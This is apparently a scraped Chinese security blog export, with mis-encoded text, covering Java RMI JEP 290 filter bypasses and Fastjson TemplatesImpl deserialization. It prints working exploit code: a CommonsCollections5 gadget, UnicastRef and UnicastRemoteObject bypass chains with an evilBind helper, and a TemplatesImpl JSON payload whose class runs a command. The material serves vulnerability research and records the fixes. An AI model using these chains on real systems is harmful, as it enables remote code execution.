é™¤äº†é™åˆ¶äº†ååºåˆ—åŒ–çš„æ·±åº¦ä»¥å¤–ï¼Œè¿˜è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼Œè¦æ±‚ç›®æ ‡ç±»ç»§æ‰¿äºç™½åå•çš„ç±»ï¼Œæ˜¾ç„¶ AnnotationInvocationHandler ç±»å¹¶ä¸ç¬¦åˆè¦æ±‚ã€‚\nè¿™ä¸ª serialFilter è¿‡æ»¤å™¨æ˜¯åœ¨ UnicastServerRef#unmarshalCustomCallData æ–¹æ³•ä¸­è®¾ç½®çš„ï¼š\nprotected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException { if (this.filter != null \u0026amp;\u0026amp; var1 instanceof ObjectInputStream) { final ObjectInputStream var2 = (ObjectInputStream)var1; AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { Config.setObjectInputFilter(var2, UnicastServerRef.this.filter); return null; } }); } } é€šè¿‡ä»¥ä¸Šåˆ†æè¿‡ç¨‹ï¼Œæ³¨æ„åˆ° JEP 290 åœ¨ RMI ä¸­æœ‰ä¸¤ä¸ªå…³é”®ç‚¹â€”â€”ä¸€æ˜¯è¦é€šè¿‡ Config.setObjectInputFilter è®¾ç½®è¿‡æ»¤å™¨ï¼›äºŒæ˜¯è¿‡æ»¤å™¨ä¸­è®¾ç½®äº†ç™½åå•ã€‚é‚£ä¹ˆæƒ³è¦ç»•è¿‡ JEP 290 è‡ªç„¶ä¼šæœ‰ä¸¤ä¸ªæ€è·¯ï¼Œæ‰¾åˆ°ä¸€ä¸ªåºåˆ—åŒ–æµï¼Œå®ƒåœ¨ååºåˆ—åŒ–ä¼ å…¥çš„å¯¹è±¡å‰æ²¡æœ‰è®¾ç½®è¿‡æ»¤å™¨ï¼Œæˆ–è€…åˆ©ç”¨ç¬¦åˆç™½åå•æ¡ä»¶çš„ç±»è¿›è¡Œæ”»å‡»ã€‚\næœªè®¾ç½®è¿‡æ»¤å™¨ è°ƒç”¨æ³¨å†Œä¸­å¿ƒçš„ bindã€ rebind ã€lookup ç­‰æ–¹æ³•éƒ½ä¼šç»è¿‡ UnicastServerRef#oldDispatchï¼Œè®¾ç½® serialFilter è¿›è¡Œç™½åå•æ£€æµ‹ã€‚ä½†æ˜¯é™¤æ­¤ä¹‹å¤–ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¹Ÿå­˜åœ¨äºè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ—¶ï¼Œæ–¹æ³•çš„å‚æ•°å’Œè¿”å›å€¼åˆ†åˆ«åœ¨ Server ç«¯å’Œ Client ç«¯è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœå®ƒä»¬æ˜¯ Object ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ é€’ä¸€ä¸ªæ¶æ„å¯¹è±¡å®Œæˆæ”»å‡»ã€‚\nåœ¨è¿œç¨‹å¯¹è±¡ä¸­å£°æ˜ä¸€ä¸ªæ–¹æ³• attackServerï¼Œæ¥æ”¶ Object å¯¹è±¡ä½œä¸ºå‚æ•°ï¼ŒClient ç«¯è°ƒç”¨ attackServer å¹¶ä¼ å…¥ cc5 æ„é€ çš„æ¶æ„å¯¹è±¡ã€‚\n// CommonsCollections5 Transformer[] transformers = new Transformer[] {...}; Transformer transformerChain = new ChainedTransformer(transformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026quot;foo\u0026quot;); BadAttributeValueExpException evilObj = new BadAttributeValueExpException(null); Field valfield = evilObj.getClass().getDeclaredField(\u0026quot;val\u0026quot;); valfield.setAccessible(true); valfield.set(evilObj, entry); Registry reigstry = LocateRegistry.getRegistry(3333); User user = (User) reigstry.lookup(\u0026quot;User\u0026quot;); user.attackServer(evilObj); é€šè¿‡å‚æ•°ä¼ é€’çš„æ¶æ„å¯¹è±¡æˆåŠŸååºåˆ—åŒ–å¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå†å°è¯•è¿œç¨‹æ–¹æ³•ä¸­ return ä¸€ä¸ªæ¶æ„å¯¹è±¡æ¥æ”»å‡» Client ç«¯ï¼ŒåŒæ ·æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œæ˜¾ç„¶ JEP 290 åœ¨æ­¤æ—¶æ²¡æœ‰èµ·åˆ°ä½œç”¨ã€‚åœ¨ filterCheck æ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹ï¼Œå½“æ£€éªŒ BadAttributeValueExpException ç±»æ—¶ï¼ŒserialFilter ä¸º nullï¼š\nä»è°ƒç”¨æ ˆå¯ä»¥å‘ç° UnicastServerRef å¯¹è±¡åœ¨å¤„ç† Client è¯·æ±‚ååºåˆ—åŒ–å‚æ•°å‰ï¼Œä¹Ÿæ‰§è¡Œäº† unmarshalCustomCallData æ–¹æ³•ï¼Œä¸è¿‡ filter å±æ€§ä¸º nullï¼Œæ²¡æœ‰è®¾ç½®ä»»ä½•è¿‡æ»¤å™¨ï¼š\nè™½ç„¶é€šè¿‡è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–æ”»å‡»æ²¡æœ‰å—åˆ° JEP 290 çš„å½±å“ï¼Œä½†æ˜¯ç°å®ä¸­è¿™äº›æ–¹æ³•ä¸å¤ªå¯èƒ½ç›´æ¥æ¥æ”¶ä¸€ä¸ª Object å¯¹è±¡ä½œä¸ºå‚æ•°æˆ–è€…è¿”å›å€¼ï¼Œè€Œé€šå¸¸æ˜¯å…¶æ´¾ç”Ÿç±»æˆ–è€…ä¸€äº›åŸºæœ¬ç±»å‹ã€‚\nå¥½åœ¨å®¢æˆ·ç«¯çš„ä»£ç æ˜¯å®Œå…¨å¯æ§çš„ï¼Œè™½ç„¶ç›´æ¥è°ƒç”¨æ–¹æ³•ä¼ é€’éæ³•å¯¹è±¡ä¼šå¼•èµ·å¼‚å¸¸ï¼Œä½†æ˜¯å®Œå…¨å¯ä»¥åœ¨æ–¹æ³•æ‰§è¡Œåï¼Œåºåˆ—åŒ–æ•°æ®å‘é€å‰è¿›è¡Œä¿®æ”¹ã€‚æ¯”å¦‚ï¼Œåƒã€ŠJava RMIã€‹ä¸­æ”»å‡» lookup è¿‡ç¨‹ä¸€æ ·ä¼ªé€ å®¢æˆ·ç«¯çš„è¯·æ±‚æµç¨‹ï¼Œæˆ–è€…é€šè¿‡ Javassistã€ASM ç­‰åŒ…ç›´æ¥ä¿®æ”¹å­—èŠ‚ç ç­‰ç­‰ã€‚\næœ¬æ¥æ‰“ç®—åœ¨æœ¬æ–‡ä»‹ç»é€šè¿‡ RASP åœ¨è¿è¡Œæ—¶ä¿®æ”¹ç›®æ ‡å‚æ•°(hook)çš„å½¢å¼å®ç°ååºåˆ—åŒ–æ”»å‡»ï¼Œä½†è€ƒè™‘åˆ°ç¯‡å¹…é—®é¢˜ï¼Œè€Œä¸” RASP çš„å®ç°ä¹Ÿæ¶‰åŠ Java Agentã€ JVMTI ã€Instrumentation ç­‰ä¸€äº›é‡è¦çš„çŸ¥è¯†ç‚¹ï¼Œæ‰€ä»¥å†³å®šå®Œæ•´å­¦ä¹ åå†åˆ†äº«æ–‡ç« ã€‚å…·ä½“å®ç°å¯ä»¥å‚è€ƒï¼šRemoteObjectInvocationHandler\nUnicastRef åœ¨ JDK 8u231 ä¹‹å‰ï¼Œå¯ä»¥åˆ©ç”¨ UnicastRef è¿™ä¸ªç™½åå•ä¸­çš„ç±»ç»•è¿‡ JEP 290ã€‚å…ˆè®©æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–è¯¥ç±»ï¼Œå®ƒå¯ä»¥å‘èµ·ä¸€ä¸ª JRMP è¿æ¥åˆ°æ¶æ„æœåŠ¡ç«¯ä¸Šï¼Œä»è€Œåœ¨ DGC(Distributed Garbage Collection) å±‚ååºåˆ—åŒ–æœåŠ¡ç«¯è¿”å›çš„å¯¹è±¡ï¼Œå› ä¸º DGC å±‚çš„ filter æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åè¿›è¡Œè®¾ç½®çš„ï¼Œæ²¡æœ‰èµ·åˆ°å®é™…ä½œç”¨2ã€‚\nç¤ºä¾‹ä»£ç ï¼š\nObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\u0026quot;127.0.0.1\u0026quot;, 12333); // JRMPListener's port is 12333 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); registry.bind(\u0026quot;User\u0026quot;, obj); æ„é€ ä¸€ä¸ª RemoteObjectInvocationHandler å‘é€ç»™æ³¨å†Œä¸­å¿ƒï¼Œå®ƒçš„ ref å±æ€§é‡Œé¢ä¿å­˜äº† JRMPListener çš„ç«¯å£ä¿¡æ¯ï¼Œç¤ºä¾‹ä»£ç ä¸­çš„å‡ ä¸ªç±»éƒ½åœ¨ RMI ç™½åå•ä¸­ã€‚æ³¨å†Œä¸­å¿ƒè¿›è¡Œ bind æ—¶ä¼šè°ƒç”¨å…¶çˆ¶ç±» Remote çš„ readObject æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶é€šè¿‡ UnicastRef#readExternal å°è£…æˆ‘ä»¬å†™å…¥çš„ IP å’Œç«¯å£ä¿¡æ¯ã€‚æ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nread:315, LiveRef (sun.rmi.transport) readExternal:489, UnicastRef (sun.rmi.server) readObject:455, RemoteObject (java.rmi.server) ... readObject0:1573, ObjectInputStream (java.io) readObject:431, ObjectInputStream (java.io) dispatch:92, RegistryImpl_Skel (sun.rmi.registry) ... è·Ÿè¿› LiveRef#read æ–¹æ³•ï¼š\nè¿™é‡Œå°†ç«¯å£ä¿¡æ¯ä¿å­˜åˆ° LiveRef å¯¹è±¡ä¸­ï¼Œè¿™äº›ä¿¡æ¯ä¼šåœ¨åé¢å‘é€ JRMP è¯·æ±‚æ—¶ç”¨åˆ°ã€‚ç„¶åè¿”å› RegistryImpl_Skel#dispatch æµç¨‹ï¼Œæ‰§è¡Œ releaseInputStream æ–¹æ³•ã€‚ä¸€ç›´è·Ÿè¿›åˆ°ä»¥ä¸‹ä»£ç ï¼Œæ‰§è¡Œ DGCClient#registerRefs å¹¶ä¸”å‚æ•°åŒ…å«æ¶æ„æœåŠ¡ç«¯çš„ç«¯å£ä¿¡æ¯ï¼š\næ‰§è¡Œåˆ° DGCImpl_Stub#dirtyï¼š\nå¯ä»¥çœ‹åˆ°åœ¨ ref å±æ€§ä¸­åŒ…å«æœåŠ¡ç«¯çš„ç«¯å£ä¿¡æ¯ï¼Œé€šè¿‡ newCall å»ºç«‹ JRMP è¿æ¥ï¼ŒwriteObject å†™å…¥è¦å‘é€çš„æ•°æ®ï¼Œç„¶åè°ƒç”¨ invoke æ–¹æ³•å¤„ç†(å‘é€)è¯·æ±‚ã€‚åœ¨ StreamRemoteCall#executeCall æ–¹æ³•ä¸­è·å–è¿æ¥çš„è¾“å…¥æµï¼Œå¹¶æ‰§è¡Œ readObject ååºåˆ—åŒ–ä»è¾“å…¥æµè·å–çš„å¯¹è±¡ï¼š\næ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nexecuteCall:252, StreamRemoteCall (sun.rmi.transport) invoke:375, UnicastRef (sun.rmi.server) dirty:109, DGCImpl_Stub (sun.rmi.transport) makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:160, DGCClient (sun.rmi.transport) registerRefs:102, ConnectionInputStream (sun.rmi.transport) releaseInputStream:157, StreamRemoteCall (sun.rmi.transport) dispatch:96, RegistryImpl_Skel (sun.rmi.registry) ... è·Ÿè¿›è¿™ä¸ªæµçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°±èƒ½çœ‹åˆ°åœ¨æ‰§è¡Œ filterCheck æ–¹æ³•æ£€æŸ¥æ¶æ„ç±» BadAttributeValueExpException æ—¶ï¼Œè¿˜æ²¡æœ‰è®¾ç½®è¿‡æ»¤å™¨ã€‚\nå› æ­¤æ¶æ„å¯¹è±¡è¢«æˆåŠŸååºåˆ—åŒ–ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚\nfix è¿™æ¡åˆ©ç”¨é“¾åœ¨ JDK 8u231 è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ DGCImpl_Stub#dirty ä¸­å…ˆè®¾ç½®äº†è¾“å…¥æµçš„è¿‡æ»¤å™¨ï¼Œå¯¼è‡´æ¶æ„ç±»æ— æ³•é€šè¿‡æ£€æµ‹ã€‚\nUnicastRemoteObject å›½å¤–å®‰å…¨ç ”ç©¶äººå‘˜ @An Trinhs å‘ç°äº†ä¸€æ¡åˆ©ç”¨é“¾ï¼Œåˆ©ç”¨ UnicastRemoteObject ç±»å¯ä»¥è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œè€Œä¸”åœ¨ JDK 8u231 ä¾ç„¶æœ‰æ•ˆã€‚ç¤ºä¾‹ä»£ç ï¼š\nRegistry registry = LocateRegistry.getRegistry(3333); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\u0026quot;127.0.0.1\u0026quot;, 12333); // JRMPListener's port is 3333 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); // jdk8u231 RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance( RMIServerSocketFactory.class.getClassLoader(), new Class[] {RMIServerSocketFactory.class, Remote.class}, obj); Constructor\u0026lt;?\u0026gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); constructor.setAccessible(true); UnicastRemoteObject clz = (UnicastRemoteObject) constructor.newInstance(null); Field ssf = UnicastRemoteObject.class.getDeclaredField(\u0026quot;ssf\u0026quot;); ssf.setAccessible(true); ssf.set(clz, rmiServerSocketFactory); evilBind(registry, \u0026quot;User\u0026quot;, clz); æœ€åä¸€è¡Œçš„ evilBind æ–¹æ³•æ˜¯ä¸ºäº†ä¿®æ”¹æŸä¸ªå‚æ•°è€Œä¼ªé€  bind çš„è¯·æ±‚é€»è¾‘ï¼Œä»£ç ä¼šåœ¨åé¢ç»™å‡ºã€‚\né‚£ä¹ˆæˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹ UnicastRemoteObject çš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå®ƒé‡å†™çš„ readObject æ–¹æ³•å¦‚ä¸‹ï¼š\nprivate void readObject(java.io.ObjectInputStream in) throws Exception { in.defaultReadObject(); reexport(); } é¦–å…ˆå¯¹è¾“å…¥æµè¿›è¡Œååºåˆ—åŒ–ï¼Œå®Œæˆå½“å‰å¯¹è±¡å±æ€§çš„èµ‹å€¼ï¼Œç„¶åæ‰§è¡Œ reexport æ–¹æ³•ã€‚è·Ÿè¿›è¯¥æ–¹æ³•ï¼Œå½“å±æ€§ ssf ä¸ä¸º null æ—¶ï¼Œå°†å®ƒä½œä¸ºå‚æ•°ä¹‹ä¸€è°ƒç”¨ exportObject å¯¼å‡ºè¿œç¨‹å¯¹è±¡ï¼š\nè·Ÿè¿›åˆ° TCPEndpoint#listenï¼Œç”Ÿæˆäº†ä¸€ä¸ª var1 å˜é‡å¹¶è°ƒç”¨å…¶ newServerSocket æ–¹æ³•ï¼Œè€Œè¿™ä¸ª var1 å®åˆ™æ˜¯æˆ‘ä»¬æ„é€ çš„åŠ¨æ€ä»£ç†å¯¹è±¡ã€‚\næ­¤æ—¶çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nlisten:335, TCPTransport (sun.rmi.transport.tcp) exportObject:254, TCPTransport (sun.rmi.transport.tcp) exportObject:411, TCPEndpoint (sun.rmi.transport.tcp) exportObject:147, LiveRef (sun.rmi.transport) exportObject:237, UnicastServerRef (sun.rmi.server) exportObject:383, UnicastRemoteObject (java.rmi.server) exportObject:346, UnicastRemoteObject (java.rmi.server) reexport:268, UnicastRemoteObject (java.rmi.server) readObject:235, UnicastRemoteObject (java.rmi.server) ... åŠ¨æ€ä»£ç†å¯¹è±¡çš„å¤„ç†ç±» RemoteObjectInvocationHandlerï¼Œå› æ­¤ä¼šæ‰§è¡Œåˆ°å®ƒçš„ invoke æ–¹æ³•ä¸­ï¼Œå¦‚æœä»£ç†çš„ç›®æ ‡å¯¹è±¡ä¸æ˜¯ Object ç±»ï¼Œåˆ™è°ƒç”¨ invokeRemoteMethod æ¥æ‰§è¡Œè¿œç¨‹æ–¹æ³•ï¼š\nç»§ç»­è·Ÿè¿› invokeRemoteMethodï¼Œè¦æ±‚å½“å‰çš„åŠ¨æ€ä»£ç†ç±»å®ç° Remote æ¥å£ï¼Œç„¶åæ‰§è¡Œ UnicastRef#invoke å’ŒæœåŠ¡ç«¯(JRMPListener)è¿›è¡Œè¿æ¥ï¼Œè°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼š\nåœ¨ StreamRemoteCall#executeCall ä¸­è¯»å–æœåŠ¡ç«¯è¿”å›çš„â€œçŠ¶æ€ç â€ï¼Œå¦‚æœè¿”å› 1 åˆ™å‘ç”Ÿå¼‚å¸¸ï¼Œå¦‚æœè¿”å› 2 åˆ™é¡ºåˆ©è¿”å›ç»“æœï¼Œåœ¨å®¢æˆ·ç«¯(æ³¨å†Œä¸­å¿ƒ)å¯¹ç»“æœååºåˆ—åŒ–ï¼š\nè¾“å…¥æµ this.in è¿˜æ²¡æœ‰è®¾ç½®è¿‡æ»¤å™¨ï¼ŒserialFilter å±æ€§ä¸ºç©ºï¼Œå› æ­¤æ¶æ„å¯¹è±¡é¡ºåˆ©ååºåˆ—åŒ–å¯¼è‡´ä»£ç æ‰§è¡Œã€‚\næœ€åå†è¯´å›ç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬æ³¨å†Œå¯¹è±¡æ—¶è°ƒç”¨çš„å¹¶ä¸æ˜¯ RegistryImpl_Stub#bindï¼Œè€Œæ˜¯è‡ªå·±æ„é€ çš„ evilBind æ–¹æ³•ã€‚è¦äº†è§£åŸå› å°±è¦åˆ†æä¸€ä¸‹æ­£å¸¸çš„ bind æ–¹æ³•çš„æ‰§è¡Œæµç¨‹ï¼Œå®ƒåœ¨æ‰§è¡Œè¾“å‡ºæµçš„ writeObject æ—¶ï¼Œè¿›è¡Œäº†ä»¥ä¸‹åˆ¤æ–­ï¼š\nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå€¼ä¸º true çš„ enableReplace å±æ€§ï¼Œå¯¼è‡´è°ƒç”¨ replaceObject æ–¹æ³•æ¥æ›¿æ¢æˆ‘ä»¬ä¼ å…¥çš„å¯¹è±¡ã€‚\nprotected final Object replaceObject(Object var1) throws IOException { if (var1 instanceof Remote \u0026amp;\u0026amp; !(var1 instanceof RemoteStub)) { Target var2 = ObjectTable.getTarget((Remote)var1); if (var2 != null) { return var2.getStub(); } } return var1; } å¦‚æœå¯¹è±¡å®ç°äº† Remote æ¥å£å°±ä¼šè¢«æ›¿æ¢æ‰ï¼Œè€Œè¿™ä¸ªåˆ©ç”¨é“¾åˆè¦æ±‚è¯¥åŠ¨æ€ä»£ç†ç±»å®ç° Remote æ¥å£æ‰èƒ½é¡ºåˆ©è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬æ¨¡ä»¿ RegistryImpl_Stub#bind çš„é€»è¾‘å†™ä¸€ä¸ªæ–°æ–¹æ³•ï¼Œåœ¨é‡Œé¢å°† enableReplace è®¾ç½®ä¸º falseã€‚\nevilBind public static void evilBind(Registry reg, String var1, Remote var2) throws Exception { // è·å–super.ref Field[] fields_0 = reg.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(reg); // è·å–operations Field[] fields_1 = reg.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(reg); StreamRemoteCall var3 = (StreamRemoteCall) ref.newCall((RemoteObject) reg, operations, 0, 4905912898345647071L); try { ObjectOutput var4 = var3.getOutputStream(); // å°†enableReplace è®¾ä¸º false Field er = var4.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026quot;enableReplace\u0026quot;); er.setAccessible(true); er.set(var4, false); var4.writeObject(var1); var4.writeObject(var2); } catch (IOException var5) { throw new MarshalException(\u0026quot;error marshalling arguments\u0026quot;, var5); } ref.invoke(var3); ref.done(var3); } fix åœ¨ JDK 8u241 ä¸­å¯¹è¿™æ¡åˆ©ç”¨é“¾è¿›è¡Œäº†ä¿®å¤ï¼Œè°ƒç”¨ UnicastRef#invoke å‰å…ˆå¯¹åŠ¨æ€ä»£ç†çš„ç›®æ ‡ç±»è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰å®ç° Remote æ¥å£å°±æŠ›å‡ºå¼‚å¸¸ã€‚è€Œ RMIServerSocketFactory å¹¶ä¸ç¬¦åˆè¦æ±‚ï¼š\næ€»ç»“ JEP 290 çš„æ ¸å¿ƒå°±æ˜¯å…è®¸å¼€å‘è€…é€šè¿‡å®ç° ObjectInputFilter æ¥å£ç»™è¾“å…¥æµå®šä¹‰è¿‡æ»¤å™¨ï¼Œå†è°ƒç”¨ ObjectInputStream#setInternalObjectInputFilter ä¸ºè¾“å…¥æµè®¾ç½®å¯¹åº”çš„è¿‡æ»¤å™¨ï¼Œåªæœ‰ç¬¦åˆæ¡ä»¶çš„å¯¹è±¡æ‰èƒ½é€šè¿‡æ£€æµ‹ç„¶åè¢«ååºåˆ—åŒ–ã€‚\nè¿œç¨‹å¯¹è±¡çš„æ–¹æ³•å‚æ•°å’Œè¿”å›å€¼åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶æ²¡æœ‰è®¾ç½®è¾“å…¥æµçš„è¿‡æ»¤å™¨ï¼Œåªè¦æƒ³åŠæ³•å‘é€æ¶æ„å¯¹è±¡å°±èƒ½æˆåŠŸååºåˆ—åŒ–ã€‚\nå¦‚æœè¦æ”»å‡»æ³¨å†Œä¸­å¿ƒï¼Œ JDK 8u231 ä»¥ä¸‹çš„ç‰ˆæœ¬å¯ä»¥åˆ©ç”¨ UnicastRef å’Œ UnicastRemoteObject ç±»ç»•è¿‡ JEP 290ï¼Œè€Œåœ¨ JDK 8u231 ç‰ˆæœ¬åªèƒ½ä½¿ç”¨åè€…ã€‚\nhttps://openjdk.java.net/jeps/290\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-04-20","permalink":"https://zrquan.github.io/posts/jep290/","tags":["java","deserialize"],"title":"Bypass JEP 290"},{"content":"Fastjson æ˜¯ alibaba çš„ä¸€æ¬¾å¼€æº JSON è§£æåº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡å’Œ JSON å­—ç¬¦ä¸²ç›¸äº’è½¬åŒ–ï¼Œå¹¶æä¾›äº† autotype æœºåˆ¶è®©ä½¿ç”¨è€…å¯ä»¥è§£æä»»æ„ Java å¯¹è±¡ï¼Œå¯¼è‡´ä¸€äº›å­˜åœ¨åˆ©ç”¨ç‚¹çš„ç±»è¢«ç”¨æ¥è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚\nTemplatesImpl åˆ©ç”¨é“¾ è¿™ä¸ªç±»å­˜åœ¨åˆ©ç”¨ç‚¹çš„æ–¹æ³•æ˜¯ getTransletInstanceï¼Œå…³é”®çš„ä»£ç å¦‚ä¸‹ï¼š\nif (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ... é¦–å…ˆæ˜¯ _name å˜é‡ä¸èƒ½ä¸ºç©ºï¼Œä¸ç„¶ç›´æ¥è¿”å› nullã€‚\nè¿™é‡Œçš„ _class æ•°ç»„ç”¨æ¥ä¿å­˜è¾…åŠ©ç±»ï¼Œé¿å…åƒåœ¾æ”¶é›†å™¨å°†å®ƒä»¬é”€æ¯ï¼Œå¹¶é€šè¿‡ newInstance æ–¹æ³•å°†ä¸»ç±»åˆå§‹åŒ–èµ‹å€¼ç»™ translet å˜é‡ã€‚å‰é¢åˆ¤æ–­å½“ _class æ•°ç»„ä¸ºç©ºæ—¶ä¼šæ‰§è¡Œ defineTransletClasses æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›åˆ†æä¸€ä¸‹ã€‚\nè¿™ä¸ªæ–¹æ³•ä¸»è¦æ˜¯å°† _bytecodes çš„å­—èŠ‚ç æå–å‡ºæ¥ï¼Œå¹¶è°ƒç”¨ loader.defineClass æ–¹æ³•ç”Ÿæˆå„ä¸ªè¾…åŠ©ç±»çš„ Class å¯¹è±¡ä¿å­˜åˆ° _class æ•°ç»„ä¸­ã€‚æ³¨æ„ä¸Šå›¾çš„ä¸¤ä¸ªçº¢æ¡†éƒ¨åˆ†â€”â€”åœ¨åˆ›å»º loader æ—¶éœ€è¦è°ƒç”¨ _tfactory ç§æœ‰å˜é‡ä¸­çš„æ–¹æ³•ï¼Œå¦‚æœå˜é‡æ˜¯ç©ºçš„è¯ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æ„é€  poc æ—¶éœ€è¦éšä¾¿è®¾ä¸€ä¸ªåˆå§‹å€¼ï¼›ä¸ºäº†å°†å½“å‰çš„ç±»è®¾ä¸ºä¸»ç±»ä½¿å®ƒåˆå§‹åŒ–ï¼Œéœ€è¦è¿™ä¸ªç±»ç»§æ‰¿ AbstractTranslet ç±»ã€‚\nç»¼ä¸Šæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ª AbstractTranslet çš„å­ç±»ä¿å­˜åˆ° _bytecodes ä¸­ï¼Œåœ¨å®ƒçš„æ„é€ æ–¹æ³•å†™å…¥å‘½ä»¤ï¼Œå½“è¿™ä¸ªæ¶æ„ç±»è¢«åˆå§‹åŒ–æ—¶å‘½ä»¤å°±ä¼šæ‰§è¡Œã€‚\npublic class EvilObject extends AbstractTranslet { public EvilObject() throws IOException { Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } ä¸ºäº†è°ƒç”¨ getTransletInstance æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ä» getOutputProperties æ–¹æ³•è¿›å…¥ï¼Œå®ƒæ˜¯ç§æœ‰å˜é‡ _outputProperties çš„ getter æ–¹æ³•ï¼Œä¼šåœ¨ Fastjson ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æ‰§è¡Œã€‚è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nFastjson è§£æè¿‡ç¨‹ é€šè¿‡ä¸‹é¢çš„ç¤ºä¾‹ä»£ç ï¼Œæ„é€ æ¶æ„ TemplatesImpl ç±»çš„ JSON å­—ç¬¦ä¸²ï¼Œè°ƒç”¨ JSON#parse æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼š\npublic class TemplatesImplPoc { public static String getBytecodes(String classPath) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); Files.copy(Paths.get(classPath), out); return Base64.getEncoder().encodeToString(out.toByteArray()); } public static void main(String[] args) throws Exception { final String evilClassPath = System.getProperty(\u0026quot;user.dir\u0026quot;) + \u0026quot;\\\\target\\\\classes\\\\EvilObject.class\u0026quot;; String evilCode = getBytecodes(evilClassPath); final String NASTY_CLASS = \u0026quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026quot;; String poc = \u0026quot;{\\\u0026quot;@type\\\u0026quot;:\\\u0026quot;\u0026quot; + NASTY_CLASS + \u0026quot;\\\u0026quot;,\\\u0026quot;_bytecodes\\\u0026quot;:[\\\u0026quot;\u0026quot; + evilCode + \u0026quot;\\\u0026quot;],'_name':'a.b','_tfactory':{},\\\u0026quot;_outputProperties\\\u0026quot;:{}}\u0026quot;; JSON.parse(poc, Feature.SupportNonPublicField); } } é¦–å…ˆç¼–è¯‘æ¶æ„ç±»å¾—åˆ° class æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹å¹¶ä¸” base64 ç¼–ç åå†™åˆ° _bytecodes æ•°ç»„ä¸­ï¼Œ @type æŒ‡å®šååºåˆ—åŒ– json å­—ç¬¦ä¸²çš„ç›®æ ‡ç±»å‹ã€‚ç„¶ååˆå§‹åŒ–äº†ä¸€äº›å±æ€§ï¼Œè¿™äº›å±æ€§çš„ä½œç”¨åœ¨å‰é¢æœ‰è§£é‡Šï¼Œç”±äºè¦è®¾ç½®ç§æœ‰å±æ€§ï¼Œååºåˆ—åŒ–æ—¶éœ€è¦å¼€å¯ SupportNonPublicField é€‰é¡¹æ‰èƒ½åˆ©ç”¨æˆåŠŸã€‚\nä¸€ç›´è·Ÿè¿›åˆ° DefaultJSONParser#parseObject æ–¹æ³•ï¼Œåˆ›å»º DefaultJSONParser å¯¹è±¡æ—¶åˆå§‹åŒ–äº† ParserConfigã€JSONScanner ç­‰é‡è¦ç±»çš„å®ä¾‹ã€‚\nFastjson 1.2.24 è¿˜æ²¡æœ‰å¼•å…¥ checkAutotype 